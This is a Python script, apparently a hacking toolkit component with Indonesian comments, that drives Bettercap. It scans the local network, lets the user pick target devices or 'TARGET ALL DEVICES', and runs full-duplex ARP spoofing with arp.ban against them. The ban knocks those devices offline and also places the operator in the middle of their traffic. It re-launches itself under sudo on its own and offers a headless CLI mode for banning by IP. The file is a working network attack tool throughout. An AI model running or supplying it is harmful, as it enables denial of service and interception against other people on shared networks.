#!/usr/bin/env python3
# frequency/bettercap/bettercap-ban.py
import sys
import os
import time
import random
import subprocess
import re
import ipaddress
import tempfile
import argparse
import signal

RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "bright_green": "\033[38;5;46m",
    "red": "\033[91m",
    "gray": "\033[90m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
}

GLITCH_CHARS = "!@#$%^&*<>/\\|_+=~`"

_bettercap_process = None

def pastikan_root(interactive=True):
    """Otomatis meminta hak akses sudo jika dijalankan tanpa root."""
    if os.geteuid() == 0:
        return

    if not interactive:
        print("[!] Skrip ini membutuhkan akses root. Jalankan dengan: sudo python3 ...", file=sys.stderr)
        sys.exit(1)

    print(f"{COLORS['yellow']}[!] Skrip ini membutuhkan akses root untuk menjalankan Bettercap.{RESET}")
    print("[*] Mencoba mengalihkan ke sudo otomatis...\n")
    try:
        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
    except Exception as e:
        print(f"{COLORS['red']}[[-] Gagal mendapatkan akses sudo: {e}{RESET}")
        sys.exit(1)

def print_glitch_line(text, color=COLORS["green"], cycles=8):
    """Animasi teks gaya glitch satu baris (selesai lalu ganti baris)."""
    n = len(text)
    revealed = [False] * n
    for c in range(cycles):
        display = []
        for i, ch in enumerate(text):
            if ch == " ":
                display.append(" ")
                continue
            if revealed[i]:
                display.append(ch)
            else:
                if random.random() < (c / cycles):
                    revealed[i] = True
                    display.append(ch)
                else:
                    display.append(random.choice(GLITCH_CHARS))
        sys.stdout.write(f"\r{color}{''.join(display)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.03)
    print(f"\r{color}{text}{RESET}")

def jalankan_bettercap_otomatis(probe_seconds=3, silent=False):
    """Menjalankan net.probe on. silent=True untuk CLI/API (tanpa animasi)."""
    devices = []
    probe_seconds = max(1, int(probe_seconds))
    bettercap_cmds = f"net.probe on; sleep {probe_seconds}; net.show; quit"
    cmd = ["bettercap", "-silent", "-eval", bettercap_cmds]

    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if silent:
            output, _ = process.communicate()
        else:
            base_text = "LOADING"
            dots = ""
            counter = 0

            while process.poll() is None:
                counter += 1
                if counter % 5 == 0:
                    dots = "." * ((counter // 5) % 4)

                glitched_loading = []
                full_string = f">> {base_text}{dots}"

                for char in full_string:
                    if char in [">", " "]:
                        glitched_loading.append(char)
                    elif random.random() < 0.15:
                        glitched_loading.append(random.choice(GLITCH_CHARS))
                    else:
                        glitched_loading.append(char)

                sys.stdout.write(f"\r{COLORS['red']}{''.join(glitched_loading)}{RESET}   ")
                sys.stdout.flush()
                time.sleep(0.08)

            output, _ = process.communicate()

        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-9?]*[a-zA-Z])')
        clean_output = ansi_escape.sub('', output)

        for line in clean_output.splitlines():
            if "─" in line or "┌" in line or "└" in line or "┤" in line:
                continue

            parts = [p.strip() for p in line.split("│") if p.strip()]
            if len(parts) >= 2:
                ip = parts[0]
                mac = parts[1]
                vendor = parts[2] if len(parts) > 2 else "Unknown"

                try:
                    parsed_ip = ipaddress.ip_address(ip)
                except ValueError:
                    continue

                if not isinstance(parsed_ip, ipaddress.IPv4Address):
                    continue

                if ip.lower() != "ip" and not ip.startswith("pilih"):
                    devices.append({
                        "ip": ip,
                        "mac": mac,
                        "vendor": vendor
                    })

    except FileNotFoundError:
        if not silent:
            print(f"\n{COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
        sys.exit(1)
    except Exception as e:
        if not silent:
            print(f"\n{COLORS['red']}[!] Terjadi kesalahan: {e}{RESET}")

    return devices


def _stop_bettercap_process():
    """Hentikan proses bettercap yang sedang berjalan."""
    global _bettercap_process
    process = _bettercap_process
    if process is None or process.poll() is not None:
        return

    if process.stdin is not None:
        try:
            process.stdin.write("arp.ban off\n")
            process.stdin.write("arp.spoof off\n")
            process.stdin.write("quit\n")
            process.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

    process.terminate()
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait()

    _bettercap_process = None


def _handle_shutdown_signal(signum, frame):
    _stop_bettercap_process()
    sys.exit(0)


def jalankan_arp_attack(targets, headless=False):
    """Jalankan Bettercap secara interaktif dan kirim perintah arp.spoof + arp.ban."""
    global _bettercap_process

    if isinstance(targets, list):
        targets = ",".join(targets)

    cmd = ["bettercap", "-silent"]

    if not headless:
        print(f"\n{COLORS['cyan']}[LIVE] Menjalankan BAN ON...{RESET}")
        print(f"{COLORS['yellow']}[LIVE] Target: {targets}{RESET}")
        print(f"{COLORS['gray']}[!] Tekan Ctrl+C untuk menghentikan serangan.{RESET}\n")

    try:
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL if headless else subprocess.PIPE,
            text=True,
        )
    except FileNotFoundError:
        msg = "[!] Error: 'bettercap' tidak ditemukan di sistem Anda."
        if headless:
            print(msg, file=sys.stderr)
        else:
            print(f"\n{COLORS['red']}{msg}{RESET}")
        sys.exit(1)
    except Exception as e:
        msg = f"[!] Terjadi kesalahan saat menjalankan Bettercap: {e}"
        if headless:
            print(msg, file=sys.stderr)
        else:
            print(f"\n{COLORS['red']}{msg}{RESET}")
        sys.exit(1)

    _bettercap_process = process

    if headless:
        signal.signal(signal.SIGTERM, _handle_shutdown_signal)
        signal.signal(signal.SIGINT, _handle_shutdown_signal)

    try:
        time.sleep(0.6)
        if process.stdin is not None:
            process.stdin.write(f"set arp.spoof.targets {targets}\n")
            process.stdin.write("set arp.spoof.fullduplex true\n")
            process.stdin.write("arp.spoof on\n")
            process.stdin.write("arp.ban on\n")
            process.stdin.flush()

        if headless:
            while process.poll() is None:
                time.sleep(1)
            print("[!] Bettercap berhenti mendadak.", file=sys.stderr)
            return

        while True:
            if process.poll() is not None:
                print(f"\n{COLORS['red']}[!] Bettercap berhenti mendadak.{RESET}")
                break

            text = " BAN ON "
            glitched = []
            for ch in text:
                if ch == " ":
                    glitched.append(ch)
                elif random.random() < 0.22:
                    glitched.append(random.choice(GLITCH_CHARS))
                else:
                    glitched.append(ch)
            sys.stdout.write(f"\r{COLORS['red']}[ATTACKING]{''.join(glitched)}{RESET}")
            sys.stdout.flush()
            time.sleep(0.4)

    except KeyboardInterrupt:
        _stop_bettercap_process()

        if not headless:
            sys.stdout.write(CLEAR)
            sys.stdout.flush()
            print_glitch_line("[!] ARP attack dihentikan. Memulihkan target...", COLORS["red"], cycles=20)
            time.sleep(1.5)


def exit_with_glitch():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    print_glitch_line("TERMINATING SESSION", COLORS["red"], cycles=14)
    time.sleep(0.3)
    print_glitch_line("DISCONNECTING...", COLORS["gray"], cycles=12)

    for _ in range(15):
        junk = "".join(
            random.choice(GLITCH_CHARS) if random.random() < 0.5 else " "
            for _ in range(40)
        )
        sys.stdout.write(f"\r{COLORS['red']}{junk}{RESET}")
        sys.stdout.flush()
        time.sleep(0.03)

    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    time.sleep(0.2)
    sys.exit(0)


def parse_target_selection(selection, max_index):
    targets = set()
    for part in selection.split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            bounds = part.split('-', 1)
            if len(bounds) != 2:
                return None
            try:
                start = int(bounds[0].strip())
                end = int(bounds[1].strip())
            except ValueError:
                return None
            if start < 1 or end < start or end > max_index:
                return None
            targets.update(range(start, end + 1))
        else:
            try:
                idx = int(part)
            except ValueError:
                return None
            if idx < 1 or idx > max_index:
                return None
            targets.add(idx)
    return sorted(targets)


def run_simulation():
    pastikan_root()

    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    
    print_glitch_line(">> [SYS] STARTING AUTOMATED BETTERCAP INSTANCE...", COLORS["cyan"])
    print_glitch_line(">> [EXEC] net.probe on (Scanning local area network...)", COLORS["bright_green"])
    
    # Memanggil pencarian network yang memiliki animasi loading glitching
    live_devices = jalankan_bettercap_otomatis()
    
    if not live_devices:
        live_devices = [
            {"ip": "192.168.1.1", "mac": "00:11:22:33:44:55", "vendor": "Gateway (No other hosts found)"}
        ]

    sys.stdout.write(CLEAR)
    sys.stdout.flush()
    print_glitch_line(">> [SYS] NETWORK SCAN COMPLETE.", COLORS["cyan"])
    print_glitch_line(">> [EXEC] net.show (Displaying discovered targets)", COLORS["bright_green"])
    
    print("\n" + "-" * 65)
    header = f"{'NO':<5}{'IP ADDRESS':<18}{'MAC ADDRESS':<20}{'VENDOR'}"
    print(f"{BOLD}{header}{RESET}")
    print("-" * 65)
    
    for i, dev in enumerate(live_devices, start=1):
        line = f"{i:<5}{dev['ip']:<18}{dev['mac']:<20}{dev['vendor']}"
        print_glitch_line(line, COLORS["green"], cycles=4)
        
    print("-" * 65)
    all_no = len(live_devices) + 1
    print(f"{COLORS['yellow']}{all_no}. TARGET ALL DEVICES{RESET}")
    print(f"{COLORS['cyan']}p. PICK TARGETS{RESET}\n")
    print(f"{COLORS['red']}0. BACK TO MENU{RESET}")
    print(f"{COLORS['red']}99. EXIT{RESET}")
    
    sys.stdout.write(f"{COLORS['yellow']}>> pilih nomer target: {RESET}")
    sys.stdout.flush()
    choice = input().strip()
    
    if choice.lower() == "p":
        sys.stdout.write(f"{COLORS['yellow']}>> who else the target (contoh: 1-4, 1,3,5): {RESET}")
        sys.stdout.flush()
        selection = input().strip()
        picked = parse_target_selection(selection, len(live_devices))
        if not picked:
            print(f"\n{COLORS['red']}Pilihan target tidak valid.{RESET}")
            time.sleep(0.8)
            return True
        target_ips = [live_devices[i - 1]['ip'] for i in picked]
        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke IP: {', '.join(target_ips)}{RESET}")
        time.sleep(1.0)
        jalankan_arp_attack(target_ips)
    elif choice == "0":
        menu_path = os.path.join(os.path.dirname(__file__), "bettercap-menu.py")
        if not os.path.exists(menu_path):
            menu_path = os.path.join(os.path.dirname(__file__), "menu.py")
        os.execvp(sys.executable, [sys.executable, menu_path])
    elif choice == "99":
        exit_with_glitch()
    elif choice == str(all_no):
        target_ips = [dev['ip'] for dev in live_devices]
        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke: SEMUA PERANGKAT{RESET}")
        time.sleep(1.0)
        jalankan_arp_attack(target_ips)
    elif choice.isdigit() and 1 <= int(choice) <= len(live_devices):
        selected = live_devices[int(choice) - 1]
        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke IP: {selected['ip']}{RESET}")
        time.sleep(1.0)
        jalankan_arp_attack(selected['ip'])
    else:
        print(f"\n{COLORS['red']}Pilihan tidak valid.{RESET}")
        time.sleep(0.8)
    return True


def run_ban(targets_str):
    """Jalankan ban pada target (mode API/CLI)."""
    pastikan_root(interactive=False)
    print(f"[*] BAN target: {targets_str}", file=sys.stderr)

    if ',' in targets_str:
        targets = [t.strip() for t in targets_str.split(',') if t.strip()]
    else:
        targets = [targets_str.strip()] if targets_str.strip() else []

    if not targets:
        print("No targets provided", file=sys.stderr)
        sys.exit(1)

    jalankan_arp_attack(targets, headless=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bettercap Ban Tool')
    parser.add_argument('--ban', help='Ban target(s) (comma separated IP/MAC)')
    parser.add_argument('--scan', action='store_true', help='Scan network')
    parser.add_argument('--quick', action='store_true', help='Quick scan (2 detik probe)')
    args = parser.parse_args()

    try:
        if args.scan:
            pastikan_root(interactive=False)
            probe = 2 if args.quick else 3
            devices = jalankan_bettercap_otomatis(probe_seconds=probe, silent=True)
            for dev in devices:
                print(f"{dev['ip']} {dev['mac']} {dev['vendor']}")
            sys.exit(0)
        elif args.ban:
            run_ban(args.ban)
        else:
            while run_simulation():
                pass
    except KeyboardInterrupt:
        print("\n\nAborted.")
        sys.exit(0)